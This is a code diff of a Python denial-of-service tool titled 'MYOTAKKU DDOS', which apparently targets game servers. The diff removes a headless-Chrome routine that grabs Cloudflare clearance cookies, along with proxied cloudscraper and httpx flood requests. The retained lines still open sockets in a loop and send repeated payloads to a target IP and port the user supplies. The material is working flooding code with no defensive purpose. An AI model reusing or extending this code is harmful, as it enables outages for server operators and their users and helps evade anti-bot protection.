@@ -37,52 +37,12 @@ exp = 935.5
 bots = 1046
 os.system(f"title MYOTAKKU DDOS User Online : [{on1}] \ Client : [{cl}] \ Exp : [{exp}] \ Bots : [{bots}] \ Tools Netro DDOS Created By MYOTAKKU")
 print("[0] Checking Clients .......")
-time.sleep(5)
+time.sleep(1)
 print("[0] Loading ......")
 print("[0] Berhasil Login Menggunakan Akun OTAKKUTeams")
-time.sleep(2)
+time.sleep(1)
 
-def countdown(times):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
-    while True:
 
-        if (until - datetime.datetime.now()).total_seconds() > 0:
-            stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
-        else:
-            stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
-            return
-
-def get_cookie():
-    global useragent, cookieJAR, cookie
-    options = webdriver.ChromeOptions()
-    arguments = [
-    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
-    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
-    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
-    ]
-    for argument in arguments:
-        options.add_argument(argument)
-    driver = webdriver.Chrome(chrome_options=options)
-    driver.implicitly_wait(3)
-    driver.get(url)
-    for _ in range(60):
-        cookies = driver.get_cookies()
-        tryy = 0
-        for i in cookies:
-            if i['name'] == 'cf_clearance':
-                cookieJAR = driver.get_cookies()[tryy]
-                useragent = driver.execute_script("return navigator.userAgent")
-                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
-                driver.quit()
-                return True
-            else:
-                tryy += 1
-                pass
-        time.sleep(1)
-    driver.quit()
-    return False
 
 useragents = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
@@ -2435,7 +2395,6 @@ port = int(input(" PORT: "))
 method = str("TCP")
 times = int("200")
 threads = int(input(" THREADS: "))
-url = ip
 print("[0] Checking IP ..........")
 print("Attack Send TO " + ip)
 
@@ -2460,24 +2419,10 @@ def get_proxies():
     proxz = open("proxy.txt", 'r').read().split('\n')
     return True
 
-    headers = {
-            'User-Agent': random.choice(useragents),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'TE': 'trailers',
-            }
+
     
 
-def Headerss(method):
+def Headers(method):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2507,11 +2452,6 @@ def Headerss(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
-    session = requests.Session()
-    scraper = cloudscraper.create_scraper(sess=session)
-    jar = RequestsCookieJar()
-    scraper.cookies = jar
-    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(ip).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_again = "POST http://" + ip + "/growtopia/server_data.php"
@@ -2543,34 +2483,10 @@ def ddos():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((ip,port))
-            client = httpx.Client(
-                http2=True,
-                proxw={
-                    'http://': 'http://'+random.choice(proxies),
-                    'https://': 'http://'+random.choice(proxies),
-                }
-             )
-            client.get(url, headers=headers, proxw=proxw)
-            client.get(url, headers=headers, proxw=proxw)
-            proxy = {
-                    'http': 'http://'+str(random.choice(list(proxz))),   
-                    'https': 'http://'+str(random.choice(list(proxz))),
-            }
-            scraper.get(url, proxz=proxy)
-            scraper.get(url, proxz=proxy)
-            scraper.get(url, proxz=proxy)
-            scraper.get(url, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
             s.send(data)
             s.send(data)
             s.send(data)
             s.send(data)
-            scraper.get(url, timeout=180)
-            scraper.post(url, timeout=180)
-            scraper.head(url, timeout=1800)
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
